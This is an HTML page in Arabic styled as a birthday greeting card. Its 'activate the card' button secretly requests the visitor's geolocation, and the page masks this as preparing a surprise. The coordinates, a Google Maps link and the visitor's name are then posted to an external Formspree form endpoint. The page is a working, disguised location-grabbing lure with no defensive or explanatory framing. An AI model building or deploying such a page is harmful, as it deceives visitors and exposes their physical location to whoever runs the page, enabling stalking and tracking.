<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>بطاقة تهنئة عيد ميلاد 🎂</title>
  <style>
    body {
      font-family: system-ui, -apple-system, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%);
      padding: 20px;
    }
    .card {
      background: #ffffff;
      padding: 35px 25px;
      border-radius: 24px;
      box-shadow: 0 12px 35px rgba(0,0,0,0.15);
      text-align: center;
      width: 100%;
      max-width: 380px;
      border: 3px solid #ff6b81;
    }
    .icon {
      font-size: 50px;
      margin-bottom: 10px;
    }
    h2 {
      color: #ff4757;
      margin-bottom: 10px;
      font-size: 24px;
    }
    .greeting-text {
      font-size: 15px;
      color: #555;
      margin-bottom: 25px;
      line-height: 1.6;
      background: #fff0f3;
      padding: 12px;
      border-radius: 12px;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-sizing: border-box;
      font-size: 16px;
      text-align: center;
      background-color: #fafafa;
    }
    .btn-geo {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background-color: #ff6b81;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-size: 15px;
      font-weight: bold;
      transition: 0.2s;
    }
    .btn-geo:hover {
      background-color: #ff4757;
    }
    .btn-submit {
      width: 100%;
      padding: 14px;
      background-color: #2ed573;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.2s;
    }
    .btn-submit:hover {
      background-color: #26af5f;
    }
    #status {
      font-size: 13px;
      margin-bottom: 15px;
      color: #666;
      font-weight: 500;
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="icon">🎉</div>
    <h2>كل عام وأنت بخير!</h2>
    <p class="greeting-text">
      أجمل التهاني وأطيب الأماني بمناسبة عيد ميلادك السعيد! 🎈<br>
      اكتب اسمك وشاركنا فرحتك لتبدأ الاحتفال معنا.
    </p>
    
    <form id="birthdayForm">
      <input type="text" id="nameInput" name="name" placeholder="أدخل اسمك الكريم هنا" required>

      <button type="button" class="btn-geo" onclick="getLocation()">اضغط هنا لتفعيل بطاقة التهنئة 🎁</button>
      
      <div id="status"></div>

      <input type="hidden" id="lat" name="latitude">
      <input type="hidden" id="lon" name="longitude">
      <input type="hidden" id="map_link" name="google_maps_link">

      <button type="button" class="btn-submit" onclick="sendData()">إرسال التهنئة الان ✨</button>
    </form>
  </div>

  <script>
    function getLocation() {
      const status = document.getElementById('status');
      if (navigator.geolocation) {
        status.innerText = "جاري تحضير مفاجأة عيد الميلاد...";
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            document.getElementById('lat').value = lat;
            document.getElementById('lon').value = lon;
            document.getElementById('map_link').value = `https://maps.google.com/?q=${lat},${lon}`;
            status.innerText = "تم تجهيز المفاجأة بنجاح! 🎉";
            status.style.color = "#2ed573";
          },
          (error) => {
            status.innerText = "تم تخطي الخطوة أو تعذر تحديد الموقع.";
            status.style.color = "#ff4757";
          }
        );
      } else {
        status.innerText = "متصفحك لا يدعم هذه الخدمة.";
      }
    }

    function sendData() {
      const name = document.getElementById('nameInput').value;
      const status = document.getElementById('status');
      
      if (!name) {
        alert("الرجاء إدخال الاسم أولاً!");
        return;
      }

      status.innerText = "جاري الإرسال...";
      status.style.color = "#333";

      const data = {
        name: name,
        latitude: document.getElementById('lat').value,
        longitude: document.getElementById('lon').value,
        google_maps_link: document.getElementById('map_link').value
      };

      fetch("https://formspree.io/f/xpqvvkdp", {
        method: "POST",
        body: JSON.stringify(data),
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
      }).then(response => {
        if (response.ok) {
          status.innerText = "تم إرسال التهنئة بنجاح! شكراً لك 🎊";
          status.style.color = "#2ed573";
          document.getElementById('birthdayForm').reset();
        } else {
          status.innerText = "حدث خطأ من الخادم، تأكد من صحة الرابط.";
          status.style.color = "#ff4757";
        }
      }).catch(error => {
        status.innerText = "تعذر الاتصال بالخادم.";
        status.style.color = "#ff4757";
      });
    }
  </script>

</body>
</html>
